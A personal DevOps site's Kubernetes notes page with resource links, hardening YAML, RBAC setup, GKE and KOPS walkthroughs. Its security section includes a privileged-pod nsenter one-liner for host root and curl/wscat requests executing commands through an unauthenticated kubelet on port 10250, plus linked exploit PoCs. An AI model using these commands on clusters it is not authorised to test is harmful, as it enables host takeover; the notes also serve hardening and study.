<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta name="author" content="d47zm3">
    <meta name="description" content="Personal DevOps &amp; Security Site">
    <meta name="keywords" content="blog,devops,personal,security">

    <base href="https://d47zm3.me">
    <title>
  Kubernetes · d47zm3
</title>

    <link rel="canonical" href="https://d47zm3.me/resources/devops/kubernetes/">

    <link href="https://fonts.googleapis.com/css?family=Lato:400,700|Merriweather:300,700|Source+Code+Pro:400,700" rel="stylesheet">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css" integrity="sha384-mzrmE5qonljUremFsqc01SB46JvROS7bZs3IO2EmfFsd15uHvIt+Y8vEf7N7fWAU" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.0/normalize.min.css" integrity="sha256-oSrCnRYXvHG31SBifqP2PM1uje7SJUyX0nTwO2RJV54=" crossorigin="anonymous" />

    
      
      
      <link rel="stylesheet" href="https://d47zm3.me/css/coder.min.42b57c75b1d9e2f7bcc89c4031716ec188e0a0e63dbde8150859ed6ad58763ec.css" integrity="sha256-QrV8dbHZ4ve8yJxAMXFuwYjgoOY9vegVCFntatWHY&#43;w=" crossorigin="anonymous" media="screen" />
    

    

    

    
      <link rel="stylesheet" href="https://d47zm3.me/css/custom.css">
    

    <link rel="icon" type="image/png" href="https://d47zm3.me/img/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="https://d47zm3.me/img/favicon-16x16.png" sizes="16x16">

    

    <meta name="generator" content="Hugo 0.53" />
  </head>

  <body class=" ">
    <main class="wrapper">
      <nav class="navigation">
  <section class="container">
    <a class="navigation-title" href="https://d47zm3.me">
      
    </a>
    <input type="checkbox" id="menu-toggle" />
    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
    <ul class="navigation-list">
      
        
          <li class="navigation-item">
            <a class="navigation-link" href="https://d47zm3.me/">Home</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="https://d47zm3.me/projects/">Projects</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="https://d47zm3.me/resources/">Resources</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="https://d47zm3.me/bookmarks/">Bookmarks</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="https://d47zm3.me/about/">About</a>
          </li>
        
      
      
    </ul>
  </section>
</nav>


      <div class="content">
        
  <section class="container page">
  <article>
    <header>
      <h1>Kubernetes</h1>
    </header>

    

<p>Everything related to Kubernetes.</p>

<h2 id="interesting-sites">Interesting Sites</h2>

<ul>
<li><p><a href="https://kubernetes.io/docs/home/?path=users&amp;persona=app-developer&amp;level=foundational">Official Docs</a> - best resource for Kubernetes</p></li>

<li><p><a href="https://kubedex.com/">Kubedex</a> - great blog with posts on Kubernetes subjects, comparing solutions etc.</p></li>

<li><p><a href="https://www.inguardians.com/labs/">Inguardians</a> - blog from redteamers about hacking &amp; securing kubernetes</p></li>

<li><p><a href="https://caylent.com/50-useful-kubernetes-tools/">50 useful Kubernetes tools</a></p></li>
</ul>

<h2 id="customization-service-mesh-grpc-more-advanced-stuff">Customization, Service Mesh, gRPC (more advanced stuff)</h2>

<h3 id="kustomization">Kustomization</h3>

<ul>
<li><p><a href="https://www.youtube.com/watch?v=ahMIBxufNR0&amp;feature=youtu.be">Kustomize: Deploy Your App with Template Free YAML - Ryan Cox, Lyft</a></p></li>

<li><p><a href="https://www.youtube.com/watch?v=WWJDbHo-OeY">Kustomize: Kubernetes Configuration Customization - K8s, Kustomize &amp; Ship SF Meetup</a></p></li>
</ul>

<h2 id="security">Security</h2>

<h3 id="articles">Articles</h3>

<ul>
<li><p><a href="https://www.cyberark.com/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions/">Interesting article about risky RBAC permissions</a></p></li>

<li><p><a href="https://www.inguardians.com/2018/12/12/attacking-and-defending-kubernetes-bust-a-kube-episode-1/">How to hack Kubernetes cluster</a> - blog post series, bust-a-kube</p></li>

<li><p><a href="https://carnal0wnage.attackresearch.com/2019/01/kubernetes-master-post.html">Kubernetes Security Master Post</a> - most of links below are from here</p></li>

<li><p><a href="https://raesene.github.io/blog/2016/10/14/Kubernetes-Attack-Surface-cAdvisor/">Kubernetes Attack Surface - cAdvisor</a></p></li>
</ul>

<h3 id="youtube-talks">YouTube Talks</h3>

<ul>
<li><p><a href="https://www.youtube.com/watch?v=1k-GIDXgfLw">Perfect Storm Taking the Helm of Kubernetes Ian Coldwater</a></p></li>

<li><p><a href="https://www.youtube.com/watch?v=dxKpCO2dAy8">A Hacker&rsquo;s Guide to Kubernetes and the Cloud - Rory McCune</a></p></li>

<li><p><a href="https://www.youtube.com/watch?v=ohTq0no0ZVU">Shipping in Pirate-Infested Waters: Practical Attack and Defense in Kubernetes</a></p></li>

<li><p><a href="https://www.youtube.com/watch?v=vTgQLzeBfRU">Hacking and Hardening Kubernetes Clusters by Example - Brad Geesaman</a></p></li>

<li><p><a href="https://github.com/bgeesaman/hhkbe [demos for the talk above]">GitHub Repository For Talk Above</a></p></li>

<li><p><a href="https://schd.ws/hosted_files/kccncna17/d8/Hacking%20and%20Hardening%20Kubernetes%20By%20Example%20v2.pdf">Slides For Talk Above</a></p></li>
</ul>

<h3 id="tools">Tools</h3>

<ul>
<li><p><a href="https://github.com/Shopify/kubeaudit">kubeaudit</a></p></li>

<li><p><a href="https://github.com/aquasecurity/kube-bench">kube-bench</a></p></li>

<li><p><a href="https://github.com/aquasecurity/kube-hunter">kube-hunter</a></p></li>

<li><p><a href="https://kubesec.io">kubesec.io</a></p></li>

<li><p><a href="https://github.com/falcosecurity/falco">sysdig falco</a></p></li>
</ul>

<h3 id="cves-exploits">CVEs/Exploits</h3>

<ul>
<li><p><a href="https://github.com/kayrus/kubelet-exploit">Kubelet Exploit</a> - very useful on older clusters</p></li>

<li><p><a href="https://github.com/gravitational/cve-2018-1002105">CVE-2018-1002105 - test you cluster</a></p></li>

<li><p><a href="https://github.com/evict/poc_CVE-2018-1002105">CVE-2018-1002105 - PoC</a></p></li>
</ul>

<h3 id="ports">Ports</h3>

<ul>
<li><p>44134/tcp - Helm Tiller, Weave, Calico</p></li>

<li><p>10250/tcp - kubelet (kublet exploit)</p>

<ul>
<li>no authN, completely open</li>
<li>/pods</li>
<li>/runningpods</li>
<li>/containerLogs</li>
</ul></li>

<li><p>10255/tcp - kublet port (read-only)</p>

<ul>
<li>/stats</li>
<li>/metrics</li>
<li>/pods</li>
</ul></li>

<li><p>4194/tcp - cAdvisor</p></li>

<li><p>2379/tcp - etcd (see it on other ports though)</p></li>

<li><p>443,6443 - api</p></li>

<li><p>30000 - dashboard</p></li>
</ul>

<h3 id="links">Links</h3>

<ul>
<li><a href="https://github.com/freach/kubernetes-security-best-practice">kubernetes-security-best-practice</a></li>
</ul>

<h3 id="harderning">Harderning</h3>

<p>Prevent default service account token mount on pods</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml">apiVersion: v1
automountServiceAccountToken: <span style="color:#66d9ef">false</span>
kind: ServiceAccount
metadata:
  creationTimestamp: <span style="color:#e6db74">2018-05-17T07:37:17Z</span>
  name: default
  namespace: default
  resourceVersion: <span style="color:#e6db74">&#34;359707&#34;</span>
  selfLink: /api/v1/namespaces/default/serviceaccounts/default
  uid: 1fbefd4a-59a5-<span style="color:#ae81ff">11e8</span>-b126-080027111f13</code></pre></div>
<p>Security Context</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml">securityContext:
  allowPrivilegeEscalation: <span style="color:#66d9ef">false</span>
  capabilities:
    drop:
      - ALL
  privileged: <span style="color:#66d9ef">false</span>
  readOnlyRootFilesystem: <span style="color:#66d9ef">true</span>
  runAsUser: <span style="color:#ae81ff">10001</span>
  fsGroup: <span style="color:#ae81ff">10001</span>
  runAsNonRoot: <span style="color:#66d9ef">true</span></code></pre></div>
<h3 id="how-to-get-root-on-kubernetes-host-without-ssh-access">How to get ROOT on Kubernetes host without SSH access</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kubectl run hack1 --restart<span style="color:#f92672">=</span>Never -t -i -n kube-system --image overriden --overrides <span style="color:#e6db74">&#39;{&#34;spec&#34;:{&#34;hostPID&#34;: true, &#34;containers&#34;:[{&#34;name&#34;:&#34;busybox&#34;,&#34;image&#34;:&#34;alpine:3.7&#34;,&#34;command&#34;:[&#34;nsenter&#34;,&#34;--mount=/proc/1/ns/mnt&#34;,&#34;--&#34;,&#34;/bin/bash&#34;],&#34;stdin&#34;:true,&#34;tty&#34;:true,&#34;securityContext&#34;:{&#34;privileged&#34;:true}}]}}&#39;</span> --rm --attach
...
hack1 / <span style="color:#75715e"># id</span>
uid<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,1<span style="color:#f92672">(</span>bin<span style="color:#f92672">)</span>,2<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span>,3<span style="color:#f92672">(</span>sys<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,6<span style="color:#f92672">(</span>disk<span style="color:#f92672">)</span>,10<span style="color:#f92672">(</span>wheel<span style="color:#f92672">)</span>,11<span style="color:#f92672">(</span>floppy<span style="color:#f92672">)</span>,20,26<span style="color:#f92672">(</span>tape<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>video<span style="color:#f92672">)</span> context<span style="color:#f92672">=</span>system_u:system_r:kernel_t:s0</code></pre></div>
<h3 id="older-kubernetes-exploit">Older Kubernetes exploit</h3>

<p>In older version, you could access Kubernetes API and execute code on containers&hellip;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ae81ff">18</span>:43:06 ~ <span style="color:#f92672">[</span>~d47zm3@w0rk~<span style="color:#f92672">]</span> » <span style="color:#f92672">(</span>⎈ |gke:default<span style="color:#f92672">)</span>  curl -sk https://hidden-master:10250/runningpods/ | python -mjson.tool | head -n10
<span style="color:#f92672">{</span>
    <span style="color:#e6db74">&#34;apiVersion&#34;</span>: <span style="color:#e6db74">&#34;v1&#34;</span>,
    <span style="color:#e6db74">&#34;items&#34;</span>: <span style="color:#f92672">[</span>
        <span style="color:#f92672">{</span>
            <span style="color:#e6db74">&#34;metadata&#34;</span>: <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;creationTimestamp&#34;</span>: null,
                <span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;dev-static-2236253618-mgbfz&#34;</span>,
                <span style="color:#e6db74">&#34;namespace&#34;</span>: <span style="color:#e6db74">&#34;default&#34;</span>,
                <span style="color:#e6db74">&#34;uid&#34;</span>: <span style="color:#e6db74">&#34;36a33122-1bc5-11e8-a41f-448a5bd877f7&#34;</span>
            <span style="color:#f92672">}</span>,

<span style="color:#75715e"># to execute code</span>

curl --insecure -v -H <span style="color:#e6db74">&#34;X-Stream-Protocol-Version: v2.channel.k8s.io&#34;</span> -H <span style="color:#e6db74">&#34;X-Stream-Protocol-Version: channel.k8s.io&#34;</span> -X POST <span style="color:#e6db74">&#34;https://kube-node-here:10250/exec///?command=touch&amp;command=hello_world&amp;input=1&amp;output=1&amp;tty=1&#34;</span>
That should <span style="color:#66d9ef">return</span> a <span style="color:#ae81ff">302</span> response with a redirect to a stream you can open:
&lt; HTTP/2 <span style="color:#ae81ff">302</span>
&lt; location: /cri/exec/PfWkLulG
&lt; content-type: text/plain; charset<span style="color:#f92672">=</span>utf-8
&lt; content-length: <span style="color:#ae81ff">0</span>
&lt; date: Tue, <span style="color:#ae81ff">13</span> Mar <span style="color:#ae81ff">2018</span> <span style="color:#ae81ff">19</span>:21:00 GMT
Now you can use wscat to open the stream:
wscat -c <span style="color:#e6db74">&#34;https://kube-node-here:10250/cri/exec/PfWkLulG&#34;</span> --no-check                                                                                                                     
connected <span style="color:#f92672">(</span>press CTRL+C to quit<span style="color:#f92672">)</span>
&lt;
&lt;
disconnected</code></pre></div>
<h2 id="rbac-basics">RBAC Basics</h2>

<p>RBAC limits the way how resources can interact with API components (for example if your application pod can query for available endpoints in your cluster). This option has been introduced in version 1.6 and greatly improves cluster security. We have basically two new resources, ClusterRole and ClusterRoleBinding. Below example uses these, but for your own safety, use Role and RoleBinding, the difference is, ClusterRole is cluster-wide and works in all namespaces.</p>

<p>First one describes cluster role together with permissions</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml">---
<span style="color:#75715e"># grant elector perms to get endpoints</span>
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1beta1
metadata:
  name: elector-endpoints-reader
rules:
  - apiGroups: [<span style="color:#e6db74">&#34;&#34;</span>] <span style="color:#75715e"># &#34;&#34; indicates the core API group</span>
    resources: [<span style="color:#e6db74">&#34;endpoints&#34;</span>]
    verbs: [<span style="color:#e6db74">&#34;get&#34;</span>, <span style="color:#e6db74">&#34;update&#34;</span>, <span style="color:#e6db74">&#34;post&#34;</span>]</code></pre></div>
<p>Besides name, you’ve got apiGroups to specify scope of API calls (usually no need to change it, unless you develop something your own), to which resources should role have access and what operations (verbs) can execute against them.</p>

<p>Second one binds that specific set to ServiceAccount</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml">---
kind: ClusterRoleBinding
apiVersion: rbac.authorization.k8s.io/v1beta1
metadata:
  name: elector-role-binding
subjects:
  - kind: ServiceAccount
    name: escenic-elector <span style="color:#75715e"># change this to your service account if you’ve specified one</span>
    namespace: default
roleRef:
 kind: ClusterRole
 name: elector-endpoints-reader
 apiGroup: rbac.authorization.k8s.io
Now there’s ServiceAccount – each deployment/replicaset runs on one, it’s nice if you separate services using different ServiceAccount for each, cause if case you don’t specify it, it will use common, default one. So how to create new SA, assign it to deployment and use RBAC?
Start with SA
apiVersion: v1
kind: ServiceAccount
metadata:
  labels:
    app: escenic-elector
  name: escenic-elector</code></pre></div>
<p>Then create RBAC role/binding (source above) and finally specify ServiceAccount in deployment.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kubectl get deployment escenic-search -o yaml  | tail -n30</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml">      ...
        volumeMounts:
        - mountPath: /config
          name: config
      dnsPolicy: ClusterFirst
      imagePullSecrets:
      - name: nwtdockerregistry
      restartPolicy: Always
      schedulerName: default-scheduler
      securityContext: {}
      serviceAccount: escenic-elector
      serviceAccountName: escenic-elector
      ...
status:
  availableReplicas: <span style="color:#ae81ff">1</span>
  ...
  observedGeneration: <span style="color:#ae81ff">6</span>
  readyReplicas: <span style="color:#ae81ff">1</span>
  replicas: <span style="color:#ae81ff">1</span>
  updatedReplicas: <span style="color:#ae81ff">1</span></code></pre></div>
<p>Here you see we specified SA for Deployment. Though RBAC at first glance seems complex, they are not that hard, biggest problem you may have is to find out required permissions to run deployment, though these kinds of rules are already compiled for popular tools like nginx.</p>

<h2 id="various-problems-solutions">Various Problems/Solutions</h2>

<h3 id="context-deadline-exceeded-cert-manager">Context Deadline Exceeded - Cert-Manager</h3>

<p>I struggled a bit with this one, as it worked fine on 1.8 Kubernetes but somehow stopped on 1.9 due to annotation on ingress, I removed it and it started working.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml">nginx.ingress.kubernetes.io/rewrite-target: /</code></pre></div>
<h3 id="access-gke-from-service-account-ci-purposes">Access GKE from service account (CI purposes)</h3>

<p>First make service account with proper IAM role (Kubernetes Engine Developer – can access cluster, cannot delete it / create etc.), get .json key, inside Docker container.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># install gcloud sdk &amp; helm</span>
root@3d3cc62016d6:~/.kube# gcloud auth activate-service-account --key-file service.json
Activated service account credentials <span style="color:#66d9ef">for</span>: <span style="color:#f92672">[</span>tiller@project.iam.gserviceaccount.com<span style="color:#f92672">]</span>
root@3d3cc62016d6:~/.kube# gcloud config set project project
Updated property <span style="color:#f92672">[</span>core/project<span style="color:#f92672">]</span>.
root@3d3cc62016d6:~/.kube# gcloud --quiet container clusters list
NAME                LOCATION        MASTER_VERSION  MASTER_IP      MACHINE_TYPE   NODE_VERSION  NUM_NODES  STATUS
...
root@3d3cc62016d6:~/.kube# gcloud components install kubectl
...
root@3d3cc62016d6:~/.kube# gcloud --quiet container clusters get-credentials my-cluster --zone europe-west1-b
Fetching cluster endpoint and auth data.
kubeconfig entry generated <span style="color:#66d9ef">for</span> my-cluster.
root@3d3cc62016d6:~/.kube# kubectl cluster-info
Kubernetes master is running at ...</code></pre></div>
<h3 id="kubernetes-updating-deployment-does-not-roll-out-new-pods">Kubernetes – updating deployment does not roll out new pods</h3>

<p>Simply rolling new tag on image had no effect, turns out it was related to ReplicaSet (that deployment uses under) was not created. Solution to that was to remove every old ReplicaSet that was not needed (desired 0) and to prevent problem in future you need to control revision history by adding spec.revisionHistoryLimit to deployment! Not sure how new versions handle that, but older (1.6) have this problem.</p>

<h3 id="kubernetes-on-gke-combine-persistent-disk-with-persistent-volume-claim">Kubernetes on GKE – combine persistent disk with persistent volume claim</h3>

<p>Due to the way I deal with disaster recovery, I needed to have Persistent Disks created within GCP and then use them through PVCs in Kubernetes, pods would use these claims and start on correct nodes then… Actually this is possible, here’s how:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># create persistent disk on GKE (here I use snapshot)</span>
gcloud compute disks create --size 250GB --source-snapshot <span style="color:#e6db74">${</span>snapshot_name<span style="color:#e6db74">}</span> nfs-disk
<span style="color:#75715e"># now, define persistent volume tied to that persistent disk</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml">kind: PersistentVolume
apiVersion: v1
metadata:
  name: nfs-pv
spec:
  storageClassName: standard
  capacity:
    storage: 250Gi
  accessModes:
    - <span style="color:#e6db74">&#34;ReadWriteOnce&#34;</span>
  gcePersistentDisk:
    fsType: ext4
    pdName: nfs-disk
  persistentVolumeReclaimPolicy: Retain
  claimRef:
    namespace: default
    name: nfs-pvc

<span style="color:#75715e"># create persistent volume claim, above pv will attach to it automatically</span>
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: nfs-pvc
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 250Gi

<span style="color:#75715e"># now when you specify volume using this PVC it will use correct PD and schedule on correct node and it will attach your disk where you want</span>
...
        volumeMounts:
          - mountPath: /exports
            name: nfs-pvc-volume
      volumes:
        - name: nfs-pvc-volume
          persistentVolumeClaim:
            claimName: nfs-pvc</code></pre></div>
<h3 id="creating-kops-cluster">Creating KOPS Cluster</h3>

<p>KOPS (Kubernetes Operations) is awesome tool for setting up Kubernetes cluster on AWS/GCP/vSphere and it supports various options like mutli-master, multi node, spreading over AZs etc. Here’s offical repo link. Let’s use AWS as it’s most stable path and easily available for everyone. You will need:</p>

<p>– AWS account</p>

<p>– Route53 DNS Domain – that’s the part you’re gonna have to shell out some money, I think best choice would be cheap, 9.0$ .be domain – simply buy it using your chosen domain name and let AWS create hosted zone for you</p>

<p>– KOPS client (binary) – available in repository as release/download using package manager</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># set up new IAM account for KOPS (using master IAM)</span>
<span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
USER<span style="color:#f92672">=</span>kops-btb
GROUP<span style="color:#f92672">=</span>kops-btb
CLUSTER<span style="color:#f92672">=</span>bethebeast.be

<span style="color:#66d9ef">function</span> decho
<span style="color:#f92672">{</span>
  string<span style="color:#f92672">=</span>$1
  echo <span style="color:#e6db74">&#34;[</span><span style="color:#66d9ef">$(</span> date +<span style="color:#e6db74">&#39;%H:%M:%S&#39;</span> <span style="color:#66d9ef">)</span><span style="color:#e6db74">] </span><span style="color:#e6db74">${</span>string<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
<span style="color:#f92672">}</span>

decho <span style="color:#e6db74">&#34;Make bucket for KOPS state store...&#34;</span>
aws s3 mb s3://kops-<span style="color:#e6db74">${</span>CLUSTER<span style="color:#e6db74">}</span>

decho <span style="color:#e6db74">&#34;Make IAM group for KOPS...&#34;</span>
aws iam create-group --group-name <span style="color:#e6db74">${</span>GROUP<span style="color:#e6db74">}</span>

export arns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;
</span><span style="color:#e6db74">arn:aws:iam::aws:policy/AmazonEC2FullAccess
</span><span style="color:#e6db74">arn:aws:iam::aws:policy/AmazonRoute53FullAccess
</span><span style="color:#e6db74">arn:aws:iam::aws:policy/AmazonS3FullAccess
</span><span style="color:#e6db74">arn:aws:iam::aws:policy/IAMFullAccess
</span><span style="color:#e6db74">arn:aws:iam::aws:policy/AmazonVPCFullAccess&#34;</span>

decho <span style="color:#e6db74">&#34;Attach right policies to IAM group...&#34;</span>
<span style="color:#66d9ef">for</span> arn in $arns; <span style="color:#66d9ef">do</span> aws iam attach-group-policy --policy-arn <span style="color:#e6db74">&#34;</span>$arn<span style="color:#e6db74">&#34;</span> --group-name <span style="color:#e6db74">${</span>GROUP<span style="color:#e6db74">}</span>; <span style="color:#66d9ef">done</span>

decho <span style="color:#e6db74">&#34;Create IAM user...&#34;</span>
aws iam create-user --user-name <span style="color:#e6db74">${</span>USER<span style="color:#e6db74">}</span>

decho <span style="color:#e6db74">&#34;Add IAM user to KOPS group...&#34;</span>
aws iam add-user-to-group --user-name <span style="color:#e6db74">${</span>USER<span style="color:#e6db74">}</span> --group-name <span style="color:#e6db74">${</span>GROUP<span style="color:#e6db74">}</span>

<span style="color:#75715e"># this will print out credentials, save them!</span>

decho <span style="color:#e6db74">&#34;Create Access Key for IAM user...&#34;</span>
aws iam create-access-key --user-name <span style="color:#e6db74">${</span>USER<span style="color:#e6db74">}</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># switch to new IAM account</span>
<span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset KOPS_CLUSTER
unset CLUSTER
unset KOPS_STATE_STORE

export AWS_ACCESS_KEY_ID<span style="color:#f92672">=</span>SECRET
export AWS_SECRET_ACCESS_KEY<span style="color:#f92672">=</span>SECRET

export CLUSTER<span style="color:#f92672">=</span>k8s.cluster.me
export KOPS_STATE_STORE<span style="color:#f92672">=</span>s3://kops-cluster.me/</code></pre></div>
<p>I chose t2.small as it’s in free tier… so using 3-node cluster isn’t a problem for couple of hours since it will be free and you can destroy it and recreate it later. Setup below will create 1-master 2-node cluster using two AZs. Remember, whenever you’re doing any operation on cluster, you need to add –yes to actually apply it, otherwise you will only preview changes.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ae81ff">13</span>:03:19 ~/bethebeast.be <span style="color:#f92672">[</span>~d47zm3@w0rk~<span style="color:#f92672">]</span> » kops create cluster --state<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>KOPS_STATE_STORE<span style="color:#e6db74">}</span> --cloud aws --zones us-east-1a,us-east-1b --node-count <span style="color:#ae81ff">2</span> --node-size t2.small --master-size t2.small <span style="color:#e6db74">${</span>CLUSTER<span style="color:#e6db74">}</span>
<span style="color:#ae81ff">13</span>:15:19 ~/bethebeast.be <span style="color:#f92672">[</span>~d47zm3@w0rk~<span style="color:#f92672">]</span> » kops update cluster --state <span style="color:#e6db74">${</span>KOPS_STATE_STORE<span style="color:#e6db74">}</span> <span style="color:#e6db74">${</span>CLUSTER<span style="color:#e6db74">}</span> --yes
...
I0804 <span style="color:#ae81ff">13</span>:15:49.166337   <span style="color:#ae81ff">47435</span> update_cluster.go:229<span style="color:#f92672">]</span> Exporting kubecfg <span style="color:#66d9ef">for</span> cluster
Kops has set your kubectl context to k8s.bethebeast.be

Cluster is starting.  It should be ready in a few minutes.

Suggestions:
 * validate cluster: kops validate cluster
 * list nodes: kubectl get nodes --show-labels
 * ssh to the master: ssh -i ~/.ssh/id_rsa admin@api.k8s.bethebeast.be
The admin user is specific to Debian. If not using Debian please use the appropriate user based on your OS.
 * read about installing addons: https://github.com/kubernetes/kops/blob/master/docs/addons.md
 
 <span style="color:#75715e"># after few minutes</span>
 
 <span style="color:#ae81ff">13</span>:20:01 ~/bethebeast.be <span style="color:#f92672">[</span>~d47zm3@w0rk~<span style="color:#f92672">]</span> » kops validate cluster
Using cluster from kubectl context: k8s.bethebeast.be

Validating cluster k8s.bethebeast.be

INSTANCE GROUPS
NAME                    ROLE    MACHINETYPE     MIN     MAX     SUBNETS
master-us-east-1a       Master  t2.small        <span style="color:#ae81ff">1</span>       <span style="color:#ae81ff">1</span>       us-east-1a
nodes                   Node    t2.small        <span style="color:#ae81ff">2</span>       <span style="color:#ae81ff">2</span>       us-east-1a,us-east-1b

NODE STATUS
NAME                            ROLE    READY
ip-172-20-49-65.ec2.internal    node    True
ip-172-20-50-77.ec2.internal    master  True
ip-172-20-93-24.ec2.internal    node    True

Your cluster k8s.bethebeast.be is ready
<span style="color:#ae81ff">13</span>:20:57 ~/bethebeast.be <span style="color:#f92672">[</span>~d47zm3@w0rk~<span style="color:#f92672">]</span> » kubectl get nodes
NAME                           STATUS    AGE       VERSION
ip-172-20-49-65.ec2.internal   Ready     1m        v1.6.2
ip-172-20-50-77.ec2.internal   Ready     2m        v1.6.2
ip-172-20-93-24.ec2.internal   Ready     1m        v1.6.2

<span style="color:#75715e"># delete cluster</span>
<span style="color:#ae81ff">13</span>:33:44 ~/bethebeast.be <span style="color:#f92672">[</span>~d47zm3@w0rk~<span style="color:#f92672">]</span> » kops delete cluster k8s.bethebeast.be --yes

<span style="color:#75715e"># upgrade cluster to newer kubernetes</span>
<span style="color:#ae81ff">14</span>:34:23 ~/bethebeast.be <span style="color:#f92672">[</span>~d47zm3@w0rk~<span style="color:#f92672">]</span> » kops edit cluster <span style="color:#e6db74">${</span>CLUSTER<span style="color:#e6db74">}</span>

<span style="color:#75715e"># edit instance group - chose other os for example</span>
<span style="color:#ae81ff">15</span>:01:50 ~/bethebeast.be <span style="color:#f92672">[</span>~d47zm3@w0rk~<span style="color:#f92672">]</span> » kops get ig
Using cluster from kubectl context: k8s.bethebeast.be

NAME                    ROLE    MACHINETYPE     MIN     MAX     SUBNETS
master-us-east-1a       Master  t2.small        <span style="color:#ae81ff">1</span>       <span style="color:#ae81ff">1</span>       us-east-1a
nodes                   Node    t2.small        <span style="color:#ae81ff">2</span>       <span style="color:#ae81ff">2</span>       us-east-1a,us-east-1b

<span style="color:#75715e"># taken for docs on github - kops or coreos, can&#39;t remember</span>

<span style="color:#ae81ff">15</span>:05:16 ~/bethebeast.be <span style="color:#f92672">[</span>~d47zm3@w0rk~<span style="color:#f92672">]</span> » aws ec2 describe-images --region<span style="color:#f92672">=</span>us-east-1 --owner<span style="color:#f92672">=</span><span style="color:#ae81ff">595879546273</span> <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>    --filters <span style="color:#e6db74">&#34;Name=virtualization-type,Values=hvm&#34;</span> <span style="color:#e6db74">&#34;Name=name,Values=CoreOS-stable*&#34;</span> <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>    --query <span style="color:#e6db74">&#39;sort_by(Images,&amp;CreationDate)[-1].{id:ImageLocation}&#39;</span>
<span style="color:#f92672">{</span>
    <span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;595879546273/CoreOS-stable-1409.7.0-hvm&#34;</span>
<span style="color:#f92672">}</span>

<span style="color:#ae81ff">15</span>:02:21 ~/bethebeast.be <span style="color:#f92672">[</span>~d47zm3@w0rk~<span style="color:#f92672">]</span> » kops  edit ig nodes <span style="color:#75715e"># change ImageID</span>
Using cluster from kubectl context: k8s.bethebeast.be

